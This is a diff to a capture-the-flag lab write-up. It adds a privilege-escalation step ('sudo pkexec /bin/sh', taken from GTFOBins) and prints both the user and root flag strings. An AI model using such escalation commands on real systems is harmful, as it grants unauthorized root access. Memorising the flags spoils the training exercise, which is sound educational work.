@@ -132,7 +132,7 @@ get <<images name>>
 But only Leave_me_alone.png cannot be open:
 
 
-![Nmap Scan Results](screenshot/leaveemealone.png)
+![Nmap Scan Results](screenshot/leaveemalone.png)
 
 So we use tools Hexeditor to see what wrong with the picture header:
 
@@ -205,30 +205,32 @@ cat user.txt
 
 ✅ User flag obtained
 
+```bash
 THM{P30P7E_K33P_53CRET5__C0MPUT3R5_D0N'T}
+```
 
 ##  5. Privilege Escalation
+
 Check Sudo Permissions
 sudo -l
 
+![Nmap Scan Results](screenshot/pkexc.png) 
+
 Found binary allowed to run as root
 
-Exploit SUID / Binary
+![Nmap Scan Results](screenshot/GTFO%20Bins.png) 
 
-Example:
+Exploit Using Binary
 
-find / -perm -u=s -type f 2>/dev/null
-Identified exploitable binary
-Used GTFOBins technique
-
-Example:
-
-sudo <binary> -option
-
-➡️ Spawned root shell
+```bash
+sudo pkexec /bin/sh
+```
 
 ## 6. Root Access
+
 whoami
+
+![Nmap Scan Results](screenshot/root.png) 
 
 Output:
 
@@ -238,15 +240,20 @@ cat root.txt
 
 ✅ Root flag obtained
 
+```bash
+THM{MY_W0RD_I5_MY_B0ND_IF_I_ACC3PT_YOUR_CONTRACT_THEN_IT_WILL_BE_COMPL3TED_OR_I'LL_BE_D34D}
+```
+
+
 ## Key Takeaways
 Always enumerate hidden directories
-Encoding (Base64) is commonly used in CTF hints
+Encoding (Base64,58.,etc) is commonly used in CTF hints
 SUID binaries are critical for privilege escalation
 GTFOBins is extremely useful
 
 ## Tools Used
 Nmap
 Gobuster
-Base64
+Base58
 SSH
 GTFOBins
